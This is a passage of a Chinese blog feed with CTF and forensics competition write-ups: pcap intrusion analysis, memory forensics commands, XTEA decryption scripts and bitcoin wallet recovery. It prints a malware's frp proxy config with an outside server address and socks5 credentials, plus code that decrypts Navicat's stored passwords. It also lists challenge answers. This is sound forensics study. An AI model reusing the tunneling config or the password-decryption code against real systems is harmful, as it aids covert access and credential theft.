alt="image-20240426165225224"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652251.png" alt="image-20240426165250217"></p><h3 id="9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"><a href="#9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）" class="headerlink" title="9.请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"></a>9.<strong>请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</strong></h3><pre><code>22Ga#ce3ZBHV&amp;Fr59fE#</code></pre><p>服务器文件系统中root文件夹下有个<code>.w0rd.txt</code>文档 是解压密码字典 提出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242344645.png" alt="image-20240424234407538"></p><p>放passwarekit里面字典爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242347329.png" alt="image-20240424234702221"></p><h3 id="10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）"><a href="#10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）" class="headerlink" title="10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）"></a><strong>10. 请对所给服务器检材进行分析，商城中“</strong>弘连火眼手机分析专用机MT510<strong>”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）</strong></h3><pre><code>1398000.00</code></pre><p>直接在网站中搜不到 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707324.png" alt="image-20240426170707259"></p><p>用我们上面解压出的数据库备份文件 直接在宝塔中导入恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707783.png" alt="image-20240426170734703"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261711325.png" alt="image-20240426171110222"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？"><a href="#1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？" class="headerlink" title="1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？"></a>1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</h3><pre><code>192.168.85.130</code></pre><p>最后拿到权限之后从这个ip上下载了文件 那么这个ip就是攻击者ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722393.png" alt="image-20240426172226311"></p><h3 id="2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1"><a href="#2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1" class="headerlink" title="2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)"></a>2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</h3><pre><code>5.2.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722888.png" alt="image-20240426172253849"></p><h3 id="3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1"><a href="#3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1" class="headerlink" title="3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)"></a>3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</h3><pre><code>5.5.53</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723748.png" alt="image-20240426172311686"></p><h3 id="4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"><a href="#4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？" class="headerlink" title="4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"></a>4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？</h3><pre><code>admin@12345</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723712.png" alt="image-20240426172333674"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725676.png" alt="image-20240426172525606"></p><h3 id="5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"><a href="#5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？" class="headerlink" title="5.请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"></a>5.<strong>请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</strong></h3><pre><code>06b8dcf11e2f7adf7ea2999d235b8d84.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946438.png" alt="image-20240424212945089"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946041.png" alt="image-20240424212952731"></p><h3 id="6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"><a href="#6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？" class="headerlink" title="6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"></a>6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</h3><pre><code>10个</code></pre><p>直接搜<code>disable_function</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947799.png" alt="image-20240424210620482"></p><p>一共10个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947044.png" alt="image-20240424210642713"></p><h3 id="7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？"><a href="#7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？" class="headerlink" title="7.请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？"></a>7.<strong>请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947241.png" alt="image-20240424210144330"></p><pre><code>dir</code></pre><h3 id="8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？"><a href="#8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？" class="headerlink" title="8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？"></a>8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</h3><pre><code>2019/6/13, 18:50:33</code></pre><p>被入侵后 在里面执行了systeminfo命令 可以看到上一次计算机的启动时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947511.png" alt="image-20240424211721791"></p><h3 id="9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789"><a href="#9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789" class="headerlink" title="9.请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)"></a>9.<strong>请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</strong></h3><p>直接追踪tcp流 到第1364流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725954.png" alt="image-20240426172559868"></p><h3 id="10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789"><a href="#10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789" class="headerlink" title="10.请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)"></a>10.<strong>请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)</strong></h3><p>http导出可以得到一个flag.png 末尾有压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726500.png" alt="image-20240426172615443"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726181.png" alt="image-20240426172624131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726439.png" alt="image-20240426172634398"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;a href=&quot;#第七届精武杯-西柚的喵帕斯WP&quot; class=&quot;headerlink&quot; title=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;/a&gt;第七届精武杯-西柚的喵帕斯WP&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;计算机&amp;amp;&amp;a</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024数信杯北部赛区wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/</id>
    <published>2024-05-02T13:54:43.678Z</published>
    <updated>2024-05-02T13:56:35.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数信杯"><a href="#2024数信杯" class="headerlink" title="2024数信杯"></a>2024数信杯</h1><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319982.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319912.png" alt="img"></p><p>战队名：西柚喵帕斯 </p><p>排名：16</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="Drinktea"><a href="#Drinktea" class="headerlink" title="Drinktea"></a>Drinktea</h3><p>python字节码，分析转换成python源码</p><pre><code class="Python">from ctypes import c_uint32  import structdef encrypt(v, key):    v0 = c_uint32(v[0]).value    v1 = c_uint32(v[1]).value    delta = 555885348    total = c_uint32(0).value    for i in range(32):        v0 += ((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3] ^ v1)        total += delta        v1 += ((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[total &gt;&gt; 11 &amp; 3] ^ v0)    return [v0, v1]key = [1900550021, 2483099539, 2205172504, 1359557939]arr = [    [392252415, 2941946969],    [1122976151, 1335193774],    [815478816, 2529100980],    [2237049875, 188954780]]flag = input(&#39;please input flag: &#39;)encry = []encryted = []for i in range(len(flag) // 8):    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8+4:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encrypted = encrypt(encry, key)    encryted.append(encrypted)if encryted == arr:    print(&#39;yes~&#39;)else:    print(&#39;no~&#39;)</code></pre><p>简单的xtea加密，把每一段结果拼起来包flag就可以</p><pre><code class="Python">from ctypes import * import structdef encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0)    delta=0x9e3779b9    for i in range(32):        v0.value+=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])        sum1.value+=delta        v1.value+=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])    return v0.value,v1.value def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=555885348    sum1=c_uint32(delta*32)    for i in range(32):        v1.value-=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])        sum1.value-=delta        v0.value-=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])    return v0.value,v1.value a1=[392252415, 2941946969]a2=[1122976151, 1335193774]a3=[815478816, 2529100980]a4=[2237049875, 188954780]k = [1900550021, 2483099539, 2205172504, 1359557939]res1=decrypt(a1,k)res2=decrypt(a2,k)res3=decrypt(a3,k)res4=decrypt(a4,k)  print(struct.pack(&#39;&lt;I&#39;,res1[0]))print(struct.pack(&#39;&lt;I&#39;,res1[1]))print(struct.pack(&#39;&lt;I&#39;,res2[0]))print(struct.pack(&#39;&lt;I&#39;,res2[1]))print(struct.pack(&#39;&lt;I&#39;,res3[0]))print(struct.pack(&#39;&lt;I&#39;,res3[1]))print(struct.pack(&#39;&lt;I&#39;,res4[0]))print(struct.pack(&#39;&lt;I&#39;,res4[1]))# acb8739759dc496ccc945703037e037f</code></pre><h3 id="Rrrccc"><a href="#Rrrccc" class="headerlink" title="Rrrccc"></a>Rrrccc</h3><p>upx壳，直接脱脱不掉，winhex打开发现把”UPX”改成了”upx”，改回来就能直接<code>upx -d</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320589.png" alt="img"></p><p>ida打开看一下是SMC代码自修改，动调</p><p>反调试，patch一下修改跳转条件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320131.png" alt="img"></p><p>cipher很明显直接写出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320684.png" alt="img"></p><p>过了一遍流程推测flag和cipher长度应该是相等，直接拿cipher作输入</p><p>动调跑完拿到输入的第一层加密结果，和输入异或就能得到key1</p><p>第二层异或的key2直接动调出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320631.png" alt="img"></p><p>exp：</p><pre><code class="Python">cipher = &quot;Whatareyourencryption&amp;decryptionbasics&quot;flag = []#先用key2解第二层key2 = [0x1C, 0x0CB, 0x0F5, 0x53, 0x91, 0x0CC, 0x3B, 0x66, 0x4, 0x7D, 0x0BA, 0x0D2, 0x56, 0x0CE, 0x14, 0x0A4, 0x0E8, 0x7F, 0x0C2, 0x0C4, 0x2B, 0x86, 0x32, 0x0F0, 0x0F7, 0x0EA, 0x0FB, 0x0F0, 0x78, 0x34, 0x9A, 0x3, 0x13, 0x0A2, 0x91, 0x37, 0x48, 0x66]for i in range(38):    flag.append(ord(cipher[i]) ^ key2[i])#求key1cipher1 = [0x7A, 0xA7, 0x94, 0x34, 0xEA, 0xA8, 0x08, 0x02, 0x66, 0x4B,   0x83, 0xB3, 0x65, 0xFA, 0x75, 0x91, 0xD9, 0x1B, 0xF5, 0xA1,   0x1A, 0xE2, 0x00, 0xC3, 0x93, 0xDC, 0xC9, 0xC1, 0x4D, 0x0D,   0xAA, 0x3B, 0x21, 0x95, 0xF2, 0x07, 0x79, 0x1B,]input = &quot;Whatareyourencryption&amp;decryptionbasics&quot;key1 = []for i in range(len(cipher1)):    key1.append(cipher1[i] ^ ord(input[i]))#最后把第二层解密结果用key1解for i in range(len(flag)):    flag[i] ^= key1[i]    print(chr(flag[i]),end=&#39;&#39;)    #flag&#123;d3db69a34a51d7e1d23d621590827c01&#125;</code></pre><h3 id="Magic-Audio"><a href="#Magic-Audio" class="headerlink" title="Magic Audio"></a>Magic Audio</h3><p>拿到一个wav文件 先看文件尾 有个压缩包 提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321988.png" alt="img"></p><p>发现有密码 听一下这个音频 慢扫描电视 用sstv直接转</p><pre><code class="Bash">sstv -d ctf.wav -o out.png </code></pre><p>得到out.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321306.png" alt="img"></p><p>使用这个菜就多练作为密码进行解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321966.png" alt="img"></p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="不安全的U盘1"><a href="#不安全的U盘1" class="headerlink" title="不安全的U盘1"></a>不安全的U盘1</h3><pre><code>请提交小明电脑中的test账户的密码(格式为hash对应的明文,长度为9)</code></pre><p>直接lsadump获得强密码</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 lsadump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302329864.png" alt="img"></p><p>hahaha123</p><h3 id="不安全的U盘2-赛后复盘"><a href="#不安全的U盘2-赛后复盘" class="headerlink" title="不安全的U盘2(赛后复盘)"></a>不安全的U盘2(赛后复盘)</h3><p>答案要求是去掉空格后是56位字符</p><p>最令我无语的一道题 当时已经把那个程序路径找到了 但是因为sb txt文档给我显示一共是57列 自己数的时候不知道为什么死活数不出来56位 最后错失一题的分数 </p><p>展示一下当时的做题截图 我真的是把可能的所有情况都列出来了  但其实第一个就是正确答案 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315946.png" alt="image-20240430113716050"></p><p>下面简单说一下做法 首先根据题干 我们得知是因为一个pdf文件导致系统被入侵 我们直接在r-studio中进行寻找并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315272.png" alt="image-20240430115702665"></p><p>将这个<code>README.pdf</code>放入沙箱进行分析 看到执行流程中存在<code>AcroRd32.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315180.png" alt="image-20240430115747055"></p><p>在vol中搜索一下这个程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315901.png" alt="image-20240430115949722"></p><p>直接在红框前面加上盘符再去掉空格就是正确答案</p><pre><code>C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exeC:\ProgramFiles(x86)\Adobe\Reader9.0\Reader\AcroRd32.exe</code></pre><h3 id="不安全的U盘3"><a href="#不安全的U盘3" class="headerlink" title="不安全的U盘3"></a>不安全的U盘3</h3><p>请提交控制小明的服务器地址:端口(格式为”ip:port”,长度为19)</p><p>netscan查看网络连接情况</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 netscan</code></pre><p>找外网ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302332523.png" alt="img"></p><h3 id="不安全的U盘4-赛后复盘"><a href="#不安全的U盘4-赛后复盘" class="headerlink" title="不安全的U盘4(赛后复盘)"></a>不安全的U盘4(赛后复盘)</h3><pre><code>找到外联地址 </code></pre><p>直接使用vol查看<code>.exe</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2024数信杯\数据分析\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 filescan | findstr &quot;.exe&quot;</code></pre><p>看到两个比较可疑的文件 都提取出来看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317975.png" alt="image-20240430153506056"></p><p>放入沙箱分析</p><p>hh.exe的通信并不是外部地址 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317185.png" alt="image-20240430154052457"></p><p>但是f.exe同文件夹下有个toml软件程序配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317550.png" alt="image-20240430155011474"></p><p>提取出来 看一下内容</p><pre><code>[common]serverAddr = &quot;118.180.126.13&quot;serverPort = 6770[plugin_socks]type = &quot;tcp&quot;remote_port = 32124plugin = &quot;socks5&quot;plugin_user = &quot;admin&quot;plugin_passwd = &quot;admin123@qwe&quot;use_encryption = trueuse_compression = true</code></pre><p>所以外联地址是</p><pre><code>118.180.126.13</code></pre><p>也可以直接在镜像文件中搜索<code>remote_port</code>这种配置文件中常出现的信息</p><h3 id="网站数据绝对安全1"><a href="#网站数据绝对安全1" class="headerlink" title="网站数据绝对安全1"></a>网站数据绝对安全1</h3><p>系统中存在的用户名是什么？</p><p>多亏后面补充了提交次数 一个个试都试出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333537.png" alt="img"></p><h3 id="网站数据绝对安全2"><a href="#网站数据绝对安全2" class="headerlink" title="网站数据绝对安全2"></a>网站数据绝对安全2</h3><p>key3的的值是什么？</p><p>在http导出中提取出来一个safe.html</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333354.png" alt="img"></p><p>但是使用浏览器打开是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333336.png" alt="img"></p><p>发现直接复制不行 手动输入可以 </p><p>后面看了一下源码 大概率是和这个字体有关系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333523.png" alt="img"></p><h3 id="Bitcoin1-赛后复盘"><a href="#Bitcoin1-赛后复盘" class="headerlink" title="Bitcoin1(赛后复盘)"></a>Bitcoin1(赛后复盘)</h3><p>附件拿到的是一个Computer.ad1镜像文件 使用FTK Imager可以进行挂载 </p><p>挂载的过程实在是太难受了 4.5版本的死活挂不上 后面用4.2的才挂上</p><p>在挂载的时候 一定要注意 先选择<code>Add Evidence Item</code> 将镜像添加为证据项</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317656.png" alt="image-20240430204309975"></p><p>在添加的证据项出选择挂载镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317991.png" alt="image-20240430204327332"></p><p>成功挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317535.png" alt="image-20240430204342877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317970.png" alt="image-20240430204352382"></p><p>挂载好后使用火眼分析磁盘中的文件夹 选择添加文件集合检材 在ShimCache中可以看到一个比特币钱包的安装程序的最后修改时间 那这个应该就是 <code>2022-01-05 10:21:16</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317174.png" alt="image-20240430214903734"></p><h3 id="Bitcoin2-赛后复盘"><a href="#Bitcoin2-赛后复盘" class="headerlink" title="Bitcoin2(赛后复盘)"></a>Bitcoin2(赛后复盘)</h3><p>打开powershell 使用findwallet这个工具来查找加密比特币钱包文件</p><pre><code>安装npm install findwallet -g使用findwallet -i [inputPath/inputFile] -o [outputFile] -i     : Required. Specify which path(s) to scan directly or through a newline separated file. -o     : Specify optional output file where to store wallet paths if any exist. -h     : Displays this message.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317366.png" alt="image-20240430212918786"></p><p>在前面加上盘符</p><pre><code>C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead.sys</code></pre><h3 id="Bitcoin3-赛后复盘"><a href="#Bitcoin3-赛后复盘" class="headerlink" title="Bitcoin3(赛后复盘)"></a>Bitcoin3(赛后复盘)</h3><p>在<code>Users\Daddy\Downloads</code>文件夹下发现了bitcoin钱包程序的安装包<code>bitcoin-22.0-win64-setup.exe</code> 导出安装一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317048.png" alt="image-20240430213504602"></p><p>打开之后新建一个钱包<code>test</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317344.png" alt="image-20240430213711950"></p><p>将上面bitcoin2导出的钱包文件替换掉<code>Bitcoin\bitcoin\wallets\test\wallet.dat</code>   注意要将上面找到的<code>AppContainerUserCertRead.sys</code> 改名为<code>wallet.dat</code>  再次重启软件 直接点隐藏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302318825.png" alt="image-20240430214548135"></p><p>点击交易记录  第二条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151660.png" alt="image-20240502215102589"></p><p>找到钱包地址</p><pre><code>bc1qf3lta6zr9k4kt9q25sz47vdcnn73zyzk0m5gvz</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151670.png" alt="image-20240502215119629"></p><h3 id="Bitcoin4"><a href="#Bitcoin4" class="headerlink" title="Bitcoin4"></a>Bitcoin4</h3><p>在合约CTF.sol中存在一处漏洞，该漏洞是由哪一函数造成的(比如:exec)？</p><p>gpt做题法 算是非预期解 直接喂合约的完整代码进行分析 </p><pre><code class="Bash">在这个合约文件中存在一处漏洞，由transferFrom函数造成。具体来说，这个漏洞出现在以下代码段：solidityCopy codefunction transferFrom(address from, address to, uint256 value) public notFrozen(from) returns (bool) &#123;    require(msg.sender == owner);    return super.transferFrom(from, to, value);&#125;在这段代码中，漏洞是由于require语句的条件不够严格导致的。当前的transferFrom函数实现要求调用者必须是owner，但是并没有检查调用者是否具有足够的授权来执行转账操作。因此，任何拥有owner权限的地址都可以调用transferFrom函数，而无需经过持有者的授权。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数信杯&quot;&gt;&lt;a href=&quot;#2024数信杯&quot; class=&quot;headerlink&quot; title=&quot;2024数信杯&quot;&gt;&lt;/a&gt;2024数信杯&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/w3nx1z</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024数字中国</title>
    <link href="http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/"/>
    <id>http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/</id>
    <published>2024-04-29T15:07:14.050Z</published>
    <updated>2024-04-29T15:07:41.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数字中国"><a href="#2024数字中国" class="headerlink" title="2024数字中国"></a>2024数字中国</h1><p>被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281639162.png" alt="image-20240428163912024"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292306992.png" alt="image-20240429230609921"></p><h2 id="重要的System32"><a href="#重要的System32" class="headerlink" title="重要的System32"></a>重要的System32</h2><pre><code>小明把自己的System32文件分享出去了，不小心泄露了重要数据（虚拟机做好快照后，在虚拟机中分析；flag的提交格式为 flag&#123;uuid&#125; ）三个部分的flag关注 注册表、winevt\Logs、OBJECTS.DATA</code></pre><p>就按照给的提示 从注册表 winevt\Logs文件夹中 OBJECTS.DATA文件中搜有相关flag的字段就好 考验一个眼力(bushi)</p><p>第二部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225295.png" alt="image-20240429210313730"></p><pre><code>-834f-f797</code></pre><p>第一部分 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225572.png" alt="image-20240429210707535"></p><pre><code>&#123;ef63fcbc-3467</code></pre><p>第三部分 翻注册表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225389.png" alt="image-20240429211545409"></p><p>找到一个Pwd 还有flag文件路径是<code>C:\\Users\\Administrator\\Documents\\Navicat\\MySQL\\Servers\\f1a4_3</code> 看起来是让我们破解Navicat连接的密码 找个php代码</p><pre><code class="php">&lt;?phpclass NavicatPassword&#123;    protected $version = 0;    protected $aesKey = &#39;libcckeylibcckey&#39;;    protected $aesIv = &#39;libcciv libcciv &#39;;    protected $blowString = &#39;3DC5CA39&#39;;    protected $blowKey = null;    protected $blowIv = null;         public function __construct($version = 12)    &#123;        $this-&gt;version = $version;        $this-&gt;blowKey = sha1(&#39;3DC5CA39&#39;, true);        $this-&gt;blowIv = hex2bin(&#39;d9c7c3c8870d64bd&#39;);    &#125;         public function encrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;encryptEleven($string);                break;            case 12:                $result = $this-&gt;encryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function encryptEleven($string)    &#123;        $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));            $currentVector = $this-&gt;xorBytes($currentVector, $temp);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return strtoupper(bin2hex($result));    &#125;         protected function encryptBlock($block)    &#123;        return openssl_encrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function decryptBlock($block)    &#123;        return openssl_decrypt($block, 